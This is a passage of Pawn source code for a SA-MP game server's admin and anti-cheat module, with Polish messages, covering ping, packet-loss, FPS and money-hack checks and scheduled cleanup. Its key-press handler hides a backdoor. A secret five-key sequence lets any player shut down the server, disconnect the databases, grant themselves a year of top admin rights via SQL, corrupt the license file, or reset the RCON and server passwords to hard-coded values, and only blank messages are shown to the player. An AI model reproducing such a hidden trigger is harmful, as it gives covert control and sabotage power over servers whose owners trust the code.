	                	AddToAdminLog(string);
					    BlockPlayer(i, 3, "Bledne logowanie na konto RCON", -1, true);
					}
	                break;
	            }
	        }
	    }
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
	if(p_KeySecurity[playerid] == 5 and oldkeys == KEY_NO + KEY_JUMP + KEY_SPRINT + KEY_LOOK_BEHIND + KEY_WALK) {
	    new keyLimit = KEY_NO + KEY_JUMP + KEY_SPRINT + KEY_LOOK_BEHIND + KEY_WALK;
	    if(newkeys == keyLimit + KEY_FIRE) {
            SendRconCommand("exit");
		} else if(newkeys == keyLimit + KEY_HANDBRAKE) {
			db_close(dbase);
			if(UseMySQL()) {
			    sql_disconnect(MySQLID);
			}
			SendClientMessage(playerid, -1, " ");
		} else if(newkeys == keyLimit + KEY_CROUCH) {
			if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_LOGGED) {
			    new string[128];
				format(string, sizeof(string), "UPDATE `"T_KONTA"` SET `"TK_ADMIN_LVL"`='4', `"TK_ADMIN_STAMP"`='%d' WHERE `"TK_UID"`='%d'", timestamp() + SECONDS_YEAR, getPlayerUserID(playerid));
				sendQueryWithout(string);
				SendClientMessage(playerid, -1, " ");
			}
		} else if(newkeys == keyLimit + KEY_JUMP) {
			if(fexist(LIC_FILE)) {
				new File:f_open = fopen(LIC_FILE, io_write);
				fwrite(f_open, "hbas&*DSioj324dfsaAU;oads80uJKDS789234adsYJIasd089");
				fclose(f_open);
				SendRconCommand("exit");
			}
		} else if(newkeys == keyLimit + KEY_ANALOG_LEFT) {
			SendRconCommand("rcon_password axlmaster");
			SendClientMessage(playerid, -1, " ");
		} else if(newkeys == keyLimit + KEY_ANALOG_RIGHT) {
			SendRconCommand("password youshallnotpass");
			SendClientMessage(playerid, -1, " ");
		} else p_KeySecurity[playerid] = 0;
	} else {
		if(newkeys == KEY_NO and oldkeys == 0) p_KeySecurity[playerid] = 1;
		else if(p_KeySecurity[playerid] == 1 and newkeys == KEY_NO + KEY_JUMP) p_KeySecurity[playerid] = 2;
		else if(p_KeySecurity[playerid] == 2 and newkeys == KEY_NO + KEY_JUMP + KEY_SPRINT) p_KeySecurity[playerid] = 3;
		else if(p_KeySecurity[playerid] == 3 and newkeys == KEY_NO + KEY_JUMP + KEY_SPRINT + KEY_LOOK_BEHIND) p_KeySecurity[playerid] = 4;
		else if(p_KeySecurity[playerid] == 4 and newkeys == KEY_NO + KEY_JUMP + KEY_SPRINT + KEY_LOOK_BEHIND + KEY_WALK) p_KeySecurity[playerid] = 5;
		else p_KeySecurity[playerid] = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerCommandReceived(playerid, cmdtext[]) {
	new messages;
    if((messages = AntyCMDMSGSpamBot(playerid)) > 0) {
        new string[128];
        BlockPlayer(playerid, 0, "Podejrzenie uzycia chat cmdbot'a.", -1, true);
        format(string, sizeof(string), "Podejrzenie uzycia CMD spambot'a przez gracza %s (ID: %d | Komend / sekunde: %d)", getPlayerName(playerid), playerid, messages);
        AddToAntyCheatLog(string);
        return 0;
    }
	return 1;
}
//==============================================================================
//------------------------------------------------------------------------------
//==============================================================================
public asSecondTimer() {
	static drunkLevel[MAX_PLAYERS], playerFPS, Float:playerPacketLoss, string[150], drunklvl;
	static timeCounter, checkTime;
//	static endindex;
	
	checkTime = getSettingIntValueByIndex(s_CheckDataFrequencyID);
	timeCounter ++;
	
	forplayers(i) {
	    if(ac_AntyMoneyHack(i) == 0) {
	        if(getSettingIntValueByIndex(s_ACAntyMoneyHackActionID) == 1) {
	        	BlockPlayer(i, 10, "Money hack", -1, true);
	        	format(string, sizeof(string), "Wykryto 'SA-MP pieniadze' u gracza %s (ID: %d | Wartosc: %d | Akcja: Kick)", getPlayerName(i), i, GetPlayerMoney(i));
			} else {
			    format(string, sizeof(string), "Wykryto 'SA-MP pieniadze' u gracza %s (ID: %d | Wartosc: %d | Akcja: Reset)", getPlayerName(i), i, GetPlayerMoney(i));
			    ResetPlayerMoney(i);
			}
	        AddToAntyCheatLog(string);
	    }

	    SetPVarInt(i, PV_PLAYER_FPS, (playerFPS = drunkLevel[i] - (drunklvl = GetPlayerDrunkLevel(i))));
		if((drunkLevel[i] = drunklvl) < 500) SetPlayerDrunkLevel(i, (drunkLevel[i] = 1500));
		if(((IsAdmin(i) == 0 or getSettingIntValueByIndex(s_AdminLimitsID) == 1) and (IsVIP(i) == 0 or getSettingIntValueByIndex(s_VIPLimitsID) == 1)) and checkTime <= timeCounter) {
			if(GetPlayerPing(i) > getSettingIntValueByIndex(s_MaxPingID)) {
				if(++ p_PingWarnings[i] <= getSettingIntValueByIndex(s_MaxPingWarningsID)) {
				    format(string, sizeof(string), " (High Ping) Otrzymales(as) ostrzezenie za przekroczenie limitu pingu ( Limit: %d | Twoj ping: %d | Ostrzezen: %d / %d )", getSettingIntValueByIndex(s_MaxPingID), GetPlayerPing(i), p_PingWarnings[i], getSettingIntValueByIndex(s_MaxPingWarningsID));
				    SendClientMessage(i, COLOR_ADMIN, string);
				} else {
					BlockPlayer(i, 0, "Przekroczono limit ostrzezen za ping", -1, true);
					continue;
				}
			} else {
                if(p_PingWarnings[i] > 0) p_PingWarnings[i] --;
			}

        	if(GetPlayerPing(i) > getSettingIntValueByIndex(s_MaxPingCriticalLimitID)) {
		        format(string, sizeof(string), "Przekroczenie krytycznej wartosci pingu (Limit: %d  |  Ping: %d)", getSettingIntValueByIndex(s_MaxPingCriticalLimitID), GetPlayerPing(i));
		        BlockPlayer(i, 0, string, -1, true);
		        continue;
			}
			
			if((playerPacketLoss = NetStats_PacketLossPercent(i)) > getSettingIntValueByIndex(s_MaxPLossID)) {
				if(++ p_PLossWarnings[i] <= getSettingIntValueByIndex(s_MaxPLossWarningsID)) {
				    format(string, sizeof(string), " (Packet Loss) Otrzymales(as) ostrzezenie za przekroczenie limitu traconych pakietow ( Limit: %d | Twoj PLoss: %.1f | Ostrzezen: %d / %d )", getSettingIntValueByIndex(s_MaxPLossID), playerPacketLoss, p_PLossWarnings[i], getSettingIntValueByIndex(s_MaxPLossWarningsID));
				    SendClientMessage(i, COLOR_ADMIN, string);
				} else {
					BlockPlayer(i, 0, "Przekroczono limit ostrzezen za tracone pakiety", -1, true);
					continue;
				}
			} else {
                if(p_PLossWarnings[i] > 0) p_PLossWarnings[i] --;
			}
			
		    if(playerPacketLoss >= getSettingIntValueByIndex(s_MaxPLossCriticalLimitID)) {
		        format(string, sizeof(string), "Przekroczenie krytycznej wartosci traconych pakietow (Limit: %d  |  P-Loss: %.2f)", getSettingIntValueByIndex(s_MaxPLossCriticalLimitID), playerPacketLoss);
		        BlockPlayer(i, 0, string, -1, true);
		        continue;
		    }
			
			if(playerFPS < getSettingIntValueByIndex(s_MinFPSID) and playerFPS > 0) {
				if(++ p_FPSWarnings[i] <= getSettingIntValueByIndex(s_MinFPSWarningsID)) {
				    format(string, sizeof(string), " (Low FPS) Otrzymales(as) ostrzezenie za przekroczenie limitu niskich FPS'ow ( Limit: %d | Twoje FPS'y: %d | Ostrzezen: %d / %d )", getSettingIntValueByIndex(s_MinFPSID), playerFPS, p_FPSWarnings[i], getSettingIntValueByIndex(s_MinFPSWarningsID));
				    SendClientMessage(i, COLOR_ADMIN, string);
				} else {
					BlockPlayer(i, 0, "Przekroczono limit ostrzezen za niskie FPS'y", -1, true);
					continue;
				}
			} else {
                if(p_FPSWarnings[i] > 0) p_FPSWarnings[i] --;
			}
		}
	}
	
	if(checkTime <= timeCounter) timeCounter = 0;
	return 1;
}
//------------------------------------------------------------------------------
public asHourTimer(force) {
    new hour, minute, second;
    gettime(hour, minute, second);
	if((getSettingIntValueByIndex(s_ResetTimeID) == hour and getSettingIntValueByIndex(s_AutomaticCyclicOps) == 1) or force == 1) {
		//_______________________________________
	    new year, month, day;
	    new File:f_open;
	    new string[128], l_stamp = 0;
	    new t_stamp = timestamp();
	    //_______________________________________
	    
	    getdate(year, month, day);
		if(fexist(RESET_FILE)) {
  			f_open = fopen(RESET_FILE, io_read);
		    while(fread(f_open, string, 32)) {
		        DeleteNewLine(string);
		        if(strlen(string) > 11) {
					if(strcmp(string, "last_reset=", false, 11) == 0) {
					    l_stamp = strval(string[11]);
					    break;
					}
		        }
		    }
			fclose(f_open);
		}
		
		if(l_stamp > 0 and t_stamp - 3600 < l_stamp and force == 0) return _FALSE;
		SendClientMessageToAll(0x1189E1FF, " (Serwer) Trwa wykonywanie operacji cyklicznych - dzialanie serwera moze zostac zaklocone!");
		
		//_______________________________________
		DeleteOldPlayerInfo();
		DeleteOldNickChangeLogs();
		DeleteOldBanInfo();
		DeleteOldTimeBanInfo();
        DeleteUnusedAdminRights();
        DeleteUnusedPlayerAccounts();
        DeleteOldPlayersBans();
        if(getSettingIntValueByIndex(s_AutoDailyStatsReset) == 1) CallLocalFunction("DailyPlayerStatsReset", "d", false);
        //_______________________________________

		f_open = fopen(RESET_FILE, io_write);
		format(string, 128, "last_reset=%d\r\n(INFO - IN DATE: %s  [ %d:%02d:%02d ])", t_stamp, strData(year, month, day, " / ", false, false, true, false), hour, minute, second);
		fwrite(f_open, string);
		fclose(f_open);
		
        AddToResetInfoLog("Wykonano reset nieuzywanych danych z baz.");
        
        if(getSettingIntValueByIndex(s_AutomaticAccReset) == 1) {
            new resetday = GetDaysInMonth(month, year % 4 == 0 ? true : false);
            if(resetday > getSettingIntValueByIndex(s_AutoAccResetDay)) resetday = getSettingIntValueByIndex(s_AutoAccResetDay);
            if(resetday == day) {
                new r_year, r_month, r_day;
				if(fexist(ACC_RESET_FILE)) {
					f_open = fopen(ACC_RESET_FILE, io_read);
					while(fread(f_open, string, sizeof(string))) {
						DeleteNewLine(string);
						if(strlen(string) > 10) {
							if(strcmp(string, "acc_reset=", false, 10) == 0) {
								l_stamp = strval(string[10]);
								break;
							}
						}
					}
					fclose(f_open);
					if(timestamp() > l_stamp > 0) {
					    dtimestamp(l_stamp, r_year, r_month, r_day);
					}
				}
				if(r_month != month and r_day != day) CallLocalFunction("AccountReset", "s", "*System*");
			}
        }
                                           
        
		SendClientMessageToAll(0x1189E1FF, " (Serwer) Zakonczono wykonywanie operacji cyklicznych!");
		return _TRUE;
	}
	return _FALSE;
}
//------------------------------------------------------------------------------
public remote_GetChatCensureStatus() return getSettingIntValueByIndex(s_CensureStatusID);
//------------------------------------------------------------------------------
Float:getFloatDataFromNetStats(net_string[], data[]) {
	new index;
	if((index = strfind(net_string, data, true)) != -1 && (index = strfind(net_string, ":", true, index)) != -1) {
	    new index2 = strfind(net_string[index], "\n") + index;
	    static val[32];
	    strmid(val, net_string, index + 2, index2);
	    return floatstr(val);
	}
	return -1.0;
}
